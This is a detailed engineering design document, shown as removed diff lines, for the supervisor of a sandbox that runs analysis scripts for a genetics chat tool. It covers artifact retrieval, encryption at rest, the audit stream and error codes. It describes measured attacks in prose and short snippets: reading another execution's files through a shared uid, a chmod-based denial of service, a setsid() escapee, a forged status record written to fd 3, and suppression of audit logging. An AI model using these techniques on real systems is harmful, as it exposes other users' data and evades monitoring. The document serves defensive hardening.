-tolerate that and must not parse `message` for meaning.
-
-#### The artifact manifest
-
-One entry per retrievable file, and **the shape is dictated by what `read_artifact` can
-actually consume** (`4h6.15`, `ToolExecutor.read_artifact` in
-`genetics-mcp-server/src/genetics_mcp_server/tools/executor.py`). That function takes a
-**bare name** and nothing else: it rejects separators, backslashes, `.`/`..`, absolute
-paths, NUL and anything where `Path(name).name != name`, then resolves the name against the
-manifests recorded for the requesting **user and** session (`(sub, sid)`) to get an
-`execution_id` and asks the sandbox for it over HTTP.
-Since `4h6.52` it performs **no local filesystem access at all** — the descriptor checks
-(`O_NOFOLLOW` on the artifacts directory, the file opened *relative to that descriptor* with
-`O_NOFOLLOW|O_NONBLOCK`, `S_ISREG`, `st_nlink == 1`) run inside the sandbox in
-`read_artifact_bytes`, against the directory the hostile child actually wrote to. See
-section 6 for why the read moved.
-
-| field | type | notes |
-|---|---|---|
-| `name` | string | the **bare** file name, e.g. `"manhattan.png"` |
-| `size` | integer | bytes, from the supervisor's `fstat` at manifest time |
-| `content_type` | string | from the **name** only |
-
-**No paths. No execution id. No URL.** An entry carrying any of those would name something
-`read_artifact` refuses by construction, and an execution id in the manifest would invite a
-model-supplied one back in — which section 6 rules out precisely because the id is
-unguessable but not confidential.
-
-The supervisor lists a file **only if it would survive that read**, which means all of:
-
-- a **regular file directly in** `/scratch/<execution-id>/artifacts` — no recursion into
-  subdirectories (their contents are unnameable by a bare name), no symlinks, no FIFOs,
-  sockets or devices;
-- `st_nlink == 1`;
-- a name that passes `read_artifact`'s own rules, and additionally is valid UTF-8, has **no
-  leading or trailing whitespace**, and has no control characters — a name the supervisor
-  cannot render is a name the model cannot ask for, and a name containing a newline would
-  forge a line break in the audit stream. The whitespace rule is not cosmetic: `executor.py`
-  does `name = name.strip()` **before** validating, so `"plot.png "` passes every other rule
-  on this list, gets listed, and is then unretrievable — the read strips it, looks up
-  `plot.png`, and returns the same indistinguishable "Artifact not found" the model gets for
-  a name that was never there. A manifest must never advertise a name the read cannot open.
-
-Anything failing those is **omitted and counted in `artifacts_omitted`**, never listed with a
-mangled name and never silently dropped: a nonzero count tells an operator something is
-there without disclosing an attacker-chosen string. Files **over the 512 KiB read limit are
-still listed** with their true size — the refusal that follows tells the model to write a
-smaller summary, which is more useful than the file appearing not to exist. Note these are
-three separate numbers and none of them is the others: the 512 KiB per-read limit
-(`ARTIFACT_READ_MAX_BYTES`, one number since `4h6.52` converged the two readers — it used to
-be 4 MiB on `read_artifact`'s own local path and 512 KiB on this route), the 64Mi
-per-execution artifact quota, and the 512Mi `emptyDir` `sizeLimit` the supervisor's
-sub-quotas must keep the kubelet away from.
-
-`content_type` is derived from the name (`mimetypes.guess_type`, falling back to
-`application/octet-stream`) and **must not** be sniffed from content: `read_artifact`
-recomputes it the same way at read time, and the two answers have to agree. Entries are
-sorted by `name`.
-
-**`size` is the one field that legitimately differs between the two.** The manifest's is the
-supervisor's `fstat` at manifest time; `read_artifact` returns `len(raw)` from its own read,
-minutes later. They disagree only if something rewrote the file after the execution ended,
-which nothing in the design does — but the two numbers are produced by different code at
-different times, so a client must not assert they are equal, and a mismatch is not a security
-event. It is noted here only so nobody adds that assertion later and gets a flaky failure.
-
-`/scratch/<execution-id>/artifacts` is retained 5 minutes after completion and everything
-else under the directory goes immediately (section 6). The manifest is what chat-backend
-records against the `jti` under the requesting `(sub, sid)` pair, so that `read_artifact`
-resolves a name server-side for that user's session and nobody else's.
-
-#### `GET /artifact` — one file back out
-
-The third route, added by `genetics-results-suite-8z1` for the automatic image fetch and made
-the **only** artifact read path by `4h6.52`, which moved `read_artifact` onto it. Two callers
-now: `_fetch_analysis_images`, which resolves the `execution_id` from the run it just
-performed, and `read_artifact`, which resolves it from the manifests recorded for the
-requesting user's session (`(sub, sid)`). The
-model supplies a **name** to the second and nothing at all to the first; no model-supplied
-value reaches this route's `execution_id`.
-
-```
-GET /artifact?execution_id=<uuid4>&name=<bare name>
-```
-
-```json
-{ "execution_id": "…", "name": "manhattan.png", "content_type": "image/png",
-  "size": 20481, "content_base64": "iVBORw0KGgo…" }
-```
-
-**Who may read what.** The `execution_id` **is** the authorisation **on this HTTP surface**,
-and the qualifier is load-bearing. It is a uuid4 minted per execution by chat-backend, equal
-to the tokens' `jti` (the supervisor refuses a request where they differ), and it is never
-rendered to the model — `_render_analysis` strips it from everything the model sees, which is
-the same property that lets the manifest carry no id. So the only caller that can name an
-execution *over the wire* is the one that submitted it. Combined with the NetworkPolicy that
-decides who reaches port 8080 at all, that is exactly the standing `/execute` has; this route
-adds no new trust assumption, only a new thing to read.
-
-**It is not a filesystem property and must not be read as one.** `/scratch` is fully
-enumerable by any process at the shared uid 65532 — MEASURED from inside a second execution's
-child, which listed `/scratch`, found a previous execution's directory by name and read its
-`artifacts/private.csv`. The id being unguessable bounds who can ask *the supervisor* for
-bytes; it bounds nothing about who can open the file. **Opening it no longer yields the
-plaintext** — see "Artifact encryption at rest" below for exactly which half of that
-`genetics-results-suite-4h6.88` closes and which half it does not — and see "What the
-retention window serves" for the integrity half (`4h6.82`).
-
-**What the retention window serves: the bytes the manifest described, or nothing**
-(`genetics-results-suite-4h6.82`). The same measurement showed the peer artifact could be
-**overwritten** and a new file **planted** beside it, so for the five minutes of retention
-this route would hand attacker-controlled content back under another user's execution id, with
-a legitimate `execution_id`, a legitimate inode inside that execution's `artifacts/`, and every
-descriptor check above satisfied. `build_manifest` therefore **hashes every file it lists**
-(sha256) and keeps the map **in the supervisor's memory** — never on the filesystem, since a
-manifest written to `/scratch` would be forged in the same breath as the file it describes —
-and `read_artifact` re-hashes what it is about to return:
-
-- a name **not in the manifest** (a planted file) is `404`, refused before it is opened;
-- a name whose **bytes have changed** is `409 ArtifactModified`, a distinct answer on purpose:
-  a caller holding a legitimate id and a manifest that named the file is entitled to know that
-  the answer is "this is no longer what you were told about" rather than a `404` it would read
-  as "retention expired";
-- a file **larger than the read cap** is listed with no digest, so a later truncation under the
-  cap makes it unverifiable rather than servable;
-- an execution retained **without a manifest ever being built** (an exception before
-  `build_manifest`, which `_register_retention` covers) has an empty map and serves nothing:
-  nothing was ever advertised for it.
-
-**"In memory" is a quantity, and it is bounded.** Per execution the map is capped by
-`ARTIFACT_ENTRY_BUDGET` = 1024 entries, each a name of at most `NAME_MAX` = 255 bytes plus a
-64-char hex digest — charged 255 + 320 B, so **~0.59 MB worst case per execution**. What was
-*not* bounded is the number of retained executions: there is no count cap, and
-`RETAINED_ARTIFACTS_CEILING_BYTES` (256 MiB) cannot evict them because it is charged `st_size`
-and **1024 zero-byte files measure 0**, so an authenticated caller submitting fast executions
-that each create 1024 long-named empty artifacts accumulated ~0.5 MB per execution for the full
-`RETENTION_S` = 300 s — against a 512 Mi pod, the OOM this document names as the worst outcome.
-Retention is therefore charged a **memory** cost as well as a disk one — 512 B per retained row
-plus 320 B + the name length per digest — and `_enforce_retained_ceiling` evicts oldest-first
-when either `RETAINED_ARTIFACTS_CEILING_BYTES` (256 MiB of artifacts) or
-`RETAINED_STATE_CEILING_BYTES` (**4 MiB of digest maps**) is exceeded, which also bounds the row
-count at 4 MiB / 512 B = 8192. **The eviction fails closed**: it is `_forget_retained`, which
-drops the directory, the id and the digest map in one step, so there is no state in which an
-execution is still readable but no longer verifiable. The cost is that a caller flooding
-retention evicts older executions sooner — the same denial the disk ceiling already accepts.
-
-**What that does *not* close, stated so the bound is not overread.** It does not stop the
-**reading** — that is `4h6.88`, and what it now bounds is stated in the next subsection; under
-one uid no *filesystem* mechanism bounds it, and encryption is not a filesystem mechanism. It does not
-cover **planting into a LIVE execution before `build_manifest` runs** — that window is inside
-what the manifest is built from, though it is now narrower, because the process-group kill and
-the fork server's sweep both run before `_retain` and `build_manifest`. It does not cover
-**deletion or DoS**: a same-uid process can still delete a retained artifact, and the answer is
-then an honest `404`.
-
-**Artifact encryption at rest** (`genetics-results-suite-4h6.88`). Between the reap and the
-manifest, the supervisor seals the retained artifacts in place with AES-256-GCM under a
-**per-execution key that exists only in the supervisor's memory** and is never written
-anywhere. `read_artifact` opens it again on the way out. The file on disk becomes
-`nonce(12) || ciphertext || tag(16)`.
-
-**The property is "a retained directory is sealed or empty", and it is structural.** Stated
-that way rather than as "every retained artifact is sealed" because the second sentence was
-measurably false: the seal pass runs on the **completion** path, so any exception out of
-`_execute_inner` — a `ForkServerError` out of `_reap`, which this module models explicitly —
-propagated **past** it, and `run()`'s `finally` then retained the directory for the whole of
-`RETENTION_S` with the child's plaintext exactly where it wrote it. It is now enforced in
-`_release`, on the retain path itself, which every route to retention passes through:
-`Job.sealed` records whether the seal pass ran, and if it did not, `_secure_unsealed` empties
-the whole execution directory (`artifacts/`, `tmp/`, `home/`, the caches) and leaves the
-directory itself in place so the id stays reserved and the reaper's schedule is unchanged.
-Nothing is lost by that: no manifest was built and no digest map was recorded, and
-`read_artifact` refuses every name of an execution with an empty map, so **every byte in such
-a directory is already unreachable through the API** and readable only by a same-uid peer.
-
-**The one case where the property does not hold is reported, not logged over.** If plaintext
-can be neither sealed nor deleted — a same-uid peer `chmod 0500` on `artifacts/` between the
-retain and the seal, MEASURED — then **no arrangement of this code removes it**, and the
-residual is exactly that: the artifacts **are** retained in the clear, readable by any process
-at the shared uid until the reaper removes the directory. What the supervisor can do is say
-so, and it does — a `LOG.error` naming the execution, and **`artifacts_retained_in_clear: true`
-in the `200` response**. It is a field of its own and not a larger `artifacts_omitted`, because
-that field means "produced, present, not listed" and cannot carry "we could not remove your
-data"; `_purge_artifacts` returns whether the directory is actually empty precisely so the
-caller can tell "destroyed everything" from "destroyed nothing".
-
-**And the caller now passes it on (`4h6.97`).** For a while it did not: `_render_analysis`
-rebuilds the tool result from a whitelist and this field was not on it, so a signal the
-supervisor raised correctly reached nobody. It is now rendered **only when true**, matching how
-`artifacts_omitted` is handled — a field that is false on every run is noise the model learns
-to skip past — with wording that says what the model can honestly act on. The exposure is to
-**other tenants' code in the pod, not to this user**: the user's own artifacts are theirs to
-see, so "your results may be compromised" would be wrong on both halves. What the note asks
-for is that the model report the cleanup failure and stop treating those artifacts as trusted
-input, because bytes readable by a peer are writable by one — the same condition
-`read_artifact`'s `409` exists to catch. The primary audience remains the **operator**, and
-that half was already working through `LOG.error`.
-
-**And the analysed script must not be able to delete it again one layer out.** Rendering the
-field was necessary and not sufficient: chat-backend truncates a serialised tool result over
-`mcp_max_result_size` (50,000 chars) to an ordered **prefix**, and `output` in a `run_analysis`
-result is **script-controlled** up to the supervisor's 64 KiB cap. MEASURED with the field
-rendered seventh, after `output`: a 66,569-byte result cut at 50,000 contained **neither the
-flag nor the note**, behind a generic `[TRUNCATED: ...]` that says nothing about a dropped
-field — so a script that both provoked the condition (`chmod` on `artifacts/`, the same
-adversarial trigger) and printed ~50 KB suppressed its own warning. Two independent defences
-now stand: `_render_analysis` emits the field and its note **ahead of `output`**, so they are
-inside any surviving prefix, and `_truncation_notice` **re-attaches the note** from the whole
-pre-truncation result, which does not depend on serialisation order at all. Both are pinned by
-`tests/test_code_execution_tools.py::TestArtifactsRetainedInClear::test_a_large_output_cannot_truncate_the_signal_away`.
-
-**It is not a `500`, and that is a fix, not an omission.** Answering `500` was the first
-attempt and it is a **same-uid denial-of-service kill switch**: MEASURED 3 for 3, a second
-process at this uid — the `setsid()` escapee this document already models — polling
-`/scratch/*/artifacts` and `chmod 0500`-ing any directory holding a file turned every
-execution into `http 500, output null`, destroying the stdout of scripts that had **run to
-completion**. And the `500` buys **no confidentiality**: in the only case that produces it,
-deletion is what failed, so the peer already holds the plaintext whether the caller is told
-`200` or `500`. `ENOSPC` does not reach this path either — injecting `OSError(ENOSPC)` into
-the seal's write answers `200` with the output and `artifacts_omitted: 1`, because `unlink`
-succeeds when the write does not — so the path is adversarial in practice, and withholding a
-successful analysis would have been the attacker's whole payoff. The caller now keeps its
-output **and** is told, in a field it can branch on, that those artifacts are exposed.
-
-The same limit applies on the `_release` side: if `_secure_unsealed` cannot delete an entry it
-says so in the log and the entry stays in the clear until the reaper removes the directory.
-Nothing here can remove a file the kernel refuses to unlink — what changed is that the code no
-longer claims it did.
-
-**What it closes, precisely: the cross-execution read of a COMPLETED execution** — the attack
-that was actually demonstrated (`listdir(/scratch)` → a peer's `artifacts/private.csv` →
-`SECRET-VICTIM-DATA`). For the 300–330 s of the retention window, a process at the shared uid
-that opens another execution's artifact now gets ciphertext.
-
-**What it does NOT close, and this list is the point of the subsection:**
-
-- **The LIVE window is untouched.** The child writes **plaintext** with a raw `open()` into
-  its own `artifacts/`, and there is **no SDK chokepoint to intercept**: the shipped SDK and
-  the stubs under `sandbox/stubs/` expose **no artifact-writing function at all** — the
-  supervisor hands the child `SANDBOX_ARTIFACTS_DIR` and the script uses ordinary file I/O.
-  So encryption *cannot* live on the write side. A same-uid resident reading **during** an
-  execution reads exactly what it read before. That window is up to `timeout_s` (1–120,
-  default 60) + `KILL_GRACE_S` (2 s), plus the reap-to-seal tail.
-- **The `setsid()` escapee keeps its write access.** A descendant that left the process group
-  survives `_kill_group` and still holds `/scratch/<id>/artifacts` (see "What the kill path
-  reaches"). Sealing writes a new inode and `rename()`s it into place, which does break the
-  fd it was already holding — but it can `open()` the name again at the same uid and write
-  over the sealed file. **GCM's tag makes that write DETECTABLE, not IMPOSSIBLE:** the read
-  answers `409 ArtifactModified` instead of serving it. This is a genuine improvement over
-  the digest map alone — the tag also catches a whole sealed file *moved* between names or
-  lifted from another execution, which a content hash cannot — and it is still detection, not
-  prevention.
-- **The key is no better protected than the digest map.** It sits in the same process memory
-  and rests on the same two things: **Yama `kernel.yama.ptrace_scope=1` plus the fact that
-  the supervisor is the child's ancestor** — **not** on the seccomp profile, which allows
-  `ptrace` (`RuntimeDefault`, MEASURED, `4h6.90`). That refusal is now MEASURED under **both**
-  `runsc` and `runc` (see "What the default profile blocks, re-derived": sibling→sibling
-  `EPERM`, parent→child allowed, identically under each), so it is a live property and not an
-  assumption — with the single point of failure named there: **uid 0 inside the sandbox would
-  void it**, because gVisor has no read-only `/proc/sys` to stop the sysctl being lowered. The
-  key inherits that standing exactly and does not improve it. What it *does* add is that the
-  key is minted **per execution** and dies with the entry it belongs to.
-- **A supervisor restart destroys every retained artifact.** This is **not a new behaviour**:
-  the whole retention registry (`_retention`, `_retained_ids`, `_artifact_digests`) is
-  already in memory only, and `wipe_unrecognised_scratch()` deletes every execution directory
-  at startup. Losing the keys changes nothing that was not already lost.
-
-**Why the key can be held here at all.** `ForkServer.start()` runs once in `bring_up()`,
-**after** `prewarm()` and **before** `ready` — so the snapshot every execution child is forked
-from is taken *before any key exists*, and no key can reach a child through it. That property
-holds only while `_forkserver_main`'s standing rule holds: **nothing per-execution may travel
-the fork-server control socket.** A key passed through it would void `4h6.55` option (b)
-outright.
-
-**Implementation choices worth knowing, because each was a fork in the road:**
-
-- **`ctypes.CDLL("libcrypto.so.3")`, no new dependency.** `sandbox/requirements.txt` pins
-  `numpy`, `scipy`, `polars`, `matplotlib`, `httpx` and nothing else; `cryptography` would add
-  a bundled OpenSSL and a large Rust-built shared object to the image whose job is to *be* the
-  boundary. The soname is **hardcoded** because `ctypes.util.find_library("crypto")` returns
-  `None` in a distroless image (no `ldconfig`, no `gcc`) — MEASURED in `genetics-sandbox:local`
-  (python 3.11.2, OpenSSL 3.0.19), where 10 MiB sealed in 0.035 s and opened in 0.033 s: about
-  0.2 s against the whole 64 MiB artifact quota, charged to the execution that produced it.
-- **The manifest still describes the PLAINTEXT.** `size` and the sha256 are measured during
-  the seal pass, while the plaintext still exists, so nothing downstream changes meaning
-  because the file grew an envelope. `4h6.82`'s digest binding is unchanged and is verified
-  **after** decryption, on the bytes that will actually be returned. Hashing the ciphertext
-  instead would have been cheaper and would have quietly redefined that property.
-- **`ARTIFACT_READ_MAX_BYTES` (512 KiB) is charged against the PLAINTEXT.** The cap exists to
-  bound the *response* — base64 of the plaintext inside a 1 MiB JSON envelope — so a sealed
-  file is allowed 28 bytes more on disk and the plaintext is re-checked after it is opened. An
-  artifact of exactly 512 KiB is served as it was before; 512 KiB + 1 is still `413`. The
-  boundary did not move in either direction, and the tests assert both sides of it.
-- **What cannot be served is deleted rather than sealed.** `read_artifact` can only be asked
-  for a bare name, and `build_manifest` lists only retrievable regular files with
-  `st_nlink == 1` directly in `artifacts/` — so a **subdirectory's contents**, a **symlink**, a
-  **hard link** and a **name with a control character in it** have no reader at all. Retaining
-  them would leave exactly the plaintext this pass exists to remove, so the pass deletes them
-  and counts them into `artifacts_omitted`.
-- **It fails closed, and "closed" means destroyed — but destruction is per file wherever it
-  can be.** A file that cannot be sealed is **deleted, counted into `artifacts_omitted`, and
-  the pass carries on**; the rest of the execution's artifacts are sealed and served normally.
-  It used to raise on the first failure and the caller destroyed the execution's whole output,
-  which cost three readable artifacts when a fourth was unreadable — the security property is
-  identical either way (what is not sealed is gone) with a blast radius of one file instead of
-  an execution, and `ENOSPC` is a realistic trigger because the seal writes a full temporary
-  copy of each artifact into the same 512Mi `emptyDir` the retained trees live in. **The
-  whole-directory purge is kept for a failure that cannot be attributed to one file** — the
-  directory not opening, more entries than the scan bound can account for, libcrypto going
-  away — because then nothing on disk has been examined and nothing on disk can be trusted.
-  The two outcomes that are *not* allowed are "plaintext left on disk and retained" and "the
-  artifact vanishes silently behind a 200"; the execution itself still answers, because the
-  retention path failing is not the script failing. If libcrypto is unusable at all,
-  `bring_up()` raises **before `ready`** and the pod CrashLoopBackOffs rather than degrading
-  quietly.
-- **The envelope costs disk, and the figure is in the units the quota uses.** 28 bytes per
-  file of *apparent* size — but the quota is charged in `st_blocks * 512 + DIRENT_COST_BYTES`,
-  not apparent size, so the overshoot is measured in **blocks**. MEASURED on a 512 KiB
-  artifact: 28 bytes of apparent growth, **4096 bytes of `st_blocks` growth**. 28 bytes can
-  push a file into at most one more 4 KiB block, so the true worst case is
-  `ARTIFACT_ENTRY_BUDGET` × 4096 = **4 MiB** per execution, not the 28 KiB an earlier revision
-  of this bullet claimed (146× low). The seal pass runs **after** `_trim_artifacts`, so a
-  retained tree can sit that far over the 64 MiB per-execution quota; the measured `st_blocks`
-  growth is added back into the cached retained size, so `RETAINED_ARTIFACTS_CEILING_BYTES`
-  (256 MiB) and the watchdog's aggregate check are still enforced over true numbers — the
-  *ceiling* stays exact and it is the *per-execution quota* that becomes a quota plus a
-  bounded envelope. `SCRATCH_AGGREGATE_CEILING_BYTES` re-measures on every poll and needs no
-  correction.
-- **A zero-byte artifact is an ordinary output and is sealed and served like any other.** An
-  empty result frame from `to_csv`, a log nothing wrote to: it seals to a bare 28-byte
-  envelope with the sha256 of `b""`, and `GET /artifact` answers `200` with an empty body.
-  This is called out because it was the one input that broke: GCM needs no update call for
-  zero bytes, the read path made one anyway, and the resulting `ValueError` out of the
-  `ctypes` layer reached `socketserver.handle_error` — which logs a traceback and **closes the
-  socket with no status line**. The startup selftest now probes the zero-byte case as well as
-  the 132-byte one, and the read path's crypto arm catches on the *property* ("the crypto
-  layer could not open this") rather than on an enumeration of exception types.
-
-**Retained executions only.** A running execution is not served: its bytes are still moving
-and a half-written PNG is worse than a 404. By the time the submitter has the id in a
-response, the execution is over and `_retain` has trimmed the directory. `404 NotFound` is
-returned identically for "never existed", "still running" and "already reaped" — which of the
-three it is would tell a caller holding a guessed id something about the pod's state.
-
-**The checks run inside the sandbox**, against the directory the child actually wrote to,
-which is the entire reason this is an HTTP route rather than chat-backend opening a path.
-`read_artifact_bytes` applies `build_manifest`'s checks in the same order —
-`_name_is_retrievable`, `O_RDONLY|O_DIRECTORY|O_NOFOLLOW` on the directory, the file opened
-**relative to that descriptor** with `O_NOFOLLOW`, regular file with `st_nlink == 1` — so
-nothing the manifest advertised is unretrievable and nothing it withheld becomes reachable by
-asking directly.
-
-| condition | status | `error.type` |
-|---|---|---|
-| served | 200 | — |
-| `execution_id` not a lowercase uuid4, or `name` fails `_name_is_retrievable` | 400 | `InvalidRequest` |
-| no such retained execution, or no such file, or not a regular file, **or a name no manifest listed** | 404 | `NotFound` |
-| file larger than `ARTIFACT_READ_MAX_BYTES` (512 KiB) | 413 | `ArtifactTooLarge` |
-| **the bytes no longer hash to what the manifest recorded** | 409 | `ArtifactModified` |
-
-The 512 KiB cap is set against `MAX_RESPONSE_BYTES` (1 MiB), not against what a plot needs:
-base64 is +33% inside a JSON envelope, so 512 KiB of file is ~700 KiB of body and stays clear.
-Letting `_cap_response` fire instead would answer "response too large", which reads as a
-supervisor fault; a 413 names the real reason. A matplotlib PNG at the SDK's default dpi is a
-few tens of KiB. Since `4h6.52` this **is** `read_artifact`'s limit as well — the tool proxies
-to this route, so the 4 MiB it used to allow on its own local read is gone and 512 KiB is the
-single per-read number. It remains distinct from the 64Mi per-execution artifact quota and the
-512Mi `emptyDir` `sizeLimit`.
-
-**What chat-backend does with it.** After a `status: ok` execution, `_fetch_analysis_images`
-fetches at most **four** artifacts whose manifest `content_type` starts with `image/` and
-whose listed size is under the cap, and attaches them to the tool result under `images`.
-`llm_service` then streams each as an `image` SSE chunk and **strips `images` from the dict
-before it is serialised into the `tool_result`** — base64 in the model's context is tokens
-paid for a thing the model cannot see. Nothing else in `artifacts/` is fetched; the
-`artifacts_note` still tells the model to print what it needs to read. `fetch_artifact` never
-raises: every refusal above, plus an unreachable sandbox, means "there is no picture", and
-losing the analysis to save the figure would be the wrong trade.
-
-#### What the supervisor owes beyond the request and the response
-
-**The audit stream (built — `4h6.45`).** `4h6.12` handed over a written specification rather
-than a puzzle, and it is an obligation of this contract even though it is not a field in it.
-The supervisor holds the **read** end of the child's audit fd (`GENETICS_SDK_AUDIT_FD`) and:
-
-- applies the rate, byte and per-line caps **on the read end**, where the child cannot reach
-  them — every in-process bound was defeated by running it, because the audited code and the
-  emitter share an address space;
-- treats the child's framing as **untrusted input**, re-parsing and re-framing before
-  anything is recorded;
-- **stamps `[user=…] [session=…] [execution=…]` from the tokens' `sub`, `sid` and `jti`** —
-  from the credential it holds, never from the body's `user`/`session_id` (which are only
-  checked against the claims) and never by asking the child. The prefix the SDK renders from
-  the child's own environment is **discarded**, not merged;
-- forwards the re-framed records to the **pod's own stdout**, the only stream the cluster's
-  logging agent collects. In the local Docker backend that is the container's stdout —
-  identical code, different collector, and the one place the deployment difference shows up
-  in behaviour rather than in configuration.
-
-Consequence for the client: **the response body carries no audit records and must not be
-expected to.** The trail leaves out of band, and a client that reads only the response learns
-nothing about what the script read.
-
-**What the read-end caps do and do not buy**, because the opposite reading is the one that
-gets cited later. They bound the stream and they cannot be reset from the child: the byte
-budget and the token bucket live in the supervisor, one instance per execution, so a flooding
-script spends **its own** budget and cannot silence the next execution's records — a
-process-global budget here would have rebuilt `4h6.12`'s suppression primitive one level up.
-What they do not do is stop a child denying attribution of **its own** later calls by flooding
-its own pipe; no read-end control can, because the flood and the records share one channel.
-What is guaranteed instead is narrower, and the narrowness is the point: every drop the
-*supervisor* makes announces itself once, in supervisor framing, and is counted in the summary
-line every execution emits (`records=… dropped_rate=… dropped_oversize=… dropped_unparseable=…
-dropped_over_budget=… bytes=…`) whether or not anything was dropped — so a **supervisor-side**
-drop is a different line from an execution that produced no records.
-
-**It is not distinguishable from child-side suppression, and no read-end control can make it
-so.** A script that disables the SDK's logger, drops its level, installs a filter, removes the
-handler (`4h6.12` measured all four, and they are still listed under "No IN-PROCESS mechanism
-can make these records trustworthy" below) or simply rewrites `GENETICS_SDK_AUDIT_FD` to `1`
-before its first SDK call writes nothing to the fd at all, and the summary it produces is
-**byte-identical** to the summary of a script that made no SDK calls: `records=0 dropped_rate=0
-dropped_oversize=0 dropped_unparseable=0 dropped_over_budget=0 bytes=0`. Both are honest
-statements about what that fd carried; neither is a statement about what the script did. Do not
-read `records=0` as "this script made no SDK calls". Making in-process suppression observable
-needs the child *contained* rather than *read* — `4h6.55` — and is not attempted here. Measured in
-the real image: a child writing 2,000 records in one `write()` recorded
-`records=202 dropped_rate=1798`; one writing 1.3 MB recorded `dropped_over_budget=3869` and
-still exited `status: "ok"`, because past the byte budget the reader keeps reading and
-discards rather than blocking the child.
-
-**What the supervisor cannot do, so no field may imply it.** Under the decided shared-uid
-model (option (b), forced — see "The uid choice") the container holds no `CAP_SETUID`,
-`CAP_SETGID` or `CAP_CHOWN`, and `setuid(65533)`/`chown(65533)` were measured to return
-`EPERM`. Therefore: no per-execution uid appears anywhere in this contract; `RLIMIT_NPROC` is
-not a per-execution control, so the pid budget is a supervisor-side watch on the child's
-process group and is not something a request can set; and the token file's protection is
-read-once-and-unlink, so a request field naming a token-file mode or owner would be
-meaningless. A supervisor written against option (a) fails at runtime, not at review.
-
-#### Error responses
-
-Every non-2xx response **except `GET /health`'s own `503`** is the same shape —
-`{"execution_id": <echo or null>, "error": {"type": …, "message": …}}` — so a client parses
-one object, not two. `/health` answers both `200` and `503` with its health body
-(`status`/`busy`/`queued`), for the reason given under that route; it is the single
-exception, and there are no others.
-
-| status | when | `error.type` |
-|---|---|---|
-| `400` | unparseable JSON, unknown field, missing or malformed field, token inconsistency, `timeout_s` out of range | `InvalidRequest` and a specific subtype |
-| `404` | any path other than `/health`, `/execute` and `/artifact` | `NotFound` |
-| `405` | wrong method on `/health`, `/execute` or `/artifact` | `MethodNotAllowed` |
-| `408` | request head not terminated within 10s (`HEAD_READ_TIMEOUT_S`), or request body not fully received within 10s (`BODY_READ_TIMEOUT_S`); connection closed | `RequestTimeout` |
-| `409` | tokens expired while queued | `TokenExpired` |
-| `409` | `execution_id` names a live or still-retained execution | `DuplicateExecutionId` |
-| `413` | body over 1 MiB, or `code` over 256 KiB | `PayloadTooLarge` |
-| `415` | request `Content-Type` is not `application/json` | `UnsupportedMediaType` |
-| `429` | queue full or maximum queued wait exceeded; carries `Retry-After` | `Busy` |
-| `431` | request line + headers exceed 64 KiB as one block (`MAX_HEADER_BYTES`), or more than 100 headers; connection closed | `PayloadTooLarge` |
-| `500` | supervisor bug | `InternalError` |
-| `503` | `POST /execute` before startup assertions pass, or while draining after `SIGTERM` | `NotReady` |
-
-The two `409`s are distinguished by `error.type`, never by the status code, and they want
-opposite responses from the client: `TokenExpired` means re-mint and retry, `DuplicateExecutionId`
-means the id was already spent and the retry needs a fresh one.
-
-`400` and `500` bodies **never echo the request payload and never carry a filesystem path or
-a traceback** — the caller supplied the payload and the paths are the sandbox's own. A `503`
-must be distinguishable by the client from a script failure: `strategy: Recreate` plus
-`terminationGracePeriodSeconds: 130` means a deploy landing on an in-flight execution leaves
-no sandbox for up to ~130s, and that must surface as "sandbox unavailable", not as "your
-analysis failed" (`4h6.47`).
-
-### As built (`4h6.39`) — the supervisor skeleton, and how its five holes were closed
-
-`sandbox/supervisor.py` implements the contract above: the HTTP front door, the queue, the
-per-execution directory and child environment, the startup assertions and the fork/reap.
-`scripts/test-supervisor.py` is its offline harness — no cluster, no credentials, no image;
-it runs the real supervisor in the local interpreter against a temporary `/scratch` root and
-forks real children. The image now carries the file (`sandbox/Dockerfile` copies it to
-`/genetics/supervisor.py`), which does **not** make the image start one: there is still no
-`CMD`. `4h6.50` supplies it from the manifest instead — `args: ["/genetics/supervisor.py"]` on
-the sandbox container — which is what clears `deploy.sh`'s refusal, last in the chain and
-deliberately so. Verified against the built image rather than assumed: `docker run <image>
-/genetics/supervisor.py` binds `:8080` and answers `/health`.
-
-**The child is forked and never exec'd.** That is what makes `prewarm()` worth anything —
-the pre-imported numpy/scipy/polars/matplotlib pages are inherited copy-on-write — and it is
-also why the child closes every inherited descriptor before running a line of the script.
-Without exec, PEP 446's non-inheritable default does nothing: the script would otherwise
-inherit the listening socket and every other in-flight client connection, and could read or
-write another user's HTTP conversation.
-
-**The one thing the contract left to this task is settled: a dedicated status pipe.** The
-child writes at most one JSON object (`type`, `message`, `traceback`) on a fixed descriptor
-and nothing else; the supervisor never parses `output` for meaning. Two reasons. The
-traceback lives at the tail of `output`, which is exactly what the 64 KiB head-and-tail cap
-elides on a chatty script; and a script can print whatever it likes, so parsing stdout lets
-the script forge its own error object. What arrives on the pipe is still **untrusted input**
-— the same process writes it — so the supervisor re-caps `message` and `traceback` and
-treats a malformed record as absent. A child that is killed writes nothing, which is the
-`type: "Killed"`, `traceback: null` case the contract already tells clients to tolerate.
-
-**The status pipe narrows the forgery it replaces; it does not close it, so the
-supervisor's own observation wins.** The child is forked and not exec'd, so the script runs
-with that descriptor open and writable: `os.write(3, b'{"type": "ValueError", …}')` followed
-by a clean exit produced `status: "error"` with `exit_code: 0` — a row the status table below
-declares impossible — until the supervisor was made to **ignore any status record when the
-child exited 0 and was not signalled**. An uncaught exception always leaves a non-zero exit,
-so no legitimate record is lost. This matters beyond tidiness: the client returns the body
-unchanged, so a forged record tells the model its own successful analysis failed, and the
-code that writes it is model-influenceable by the prompt-injection path in §6.4.
-
-**This section was written when five behaviours were missing. All five have since landed** —
-`4h6.41` (wall clock, `RLIMIT_AS`, `oom_score_adj`, pid policing), `4h6.42` (the two output
-bounds), `4h6.43` (token delivery), `4h6.45` (the audit stream) and `4h6.46` (quotas,
-retention, reaper); see "As built" below for what each of them actually does and what it
-measurably does not.
-
-`4h6.45` could not be a drop-in and was not: a descriptor reaches the child only by existing
-before the fork, so it edits `_execute_inner` (create the pipe pre-fork, drain the read end on
-a third thread sharing the same reaped-child deadline the other two use), `_child_main` (dup
-it onto `CHILD_AUDIT_FD` and add that number to the `_close_inherited_fds` keep-set — a number
-missing from that set is closed a few lines later and every SDK record raises inside a
-successful data call) and `child_env` (export `GENETICS_SDK_AUDIT_FD`).
-
-The lossy UTF-8 decode of `output` **is** contract behaviour and is implemented: invalid
-bytes become U+FFFD, and there is no alternate encoding and no `encoding` field.
-
-**Where the contract was silent, and what was chosen.** Each of these is a place two
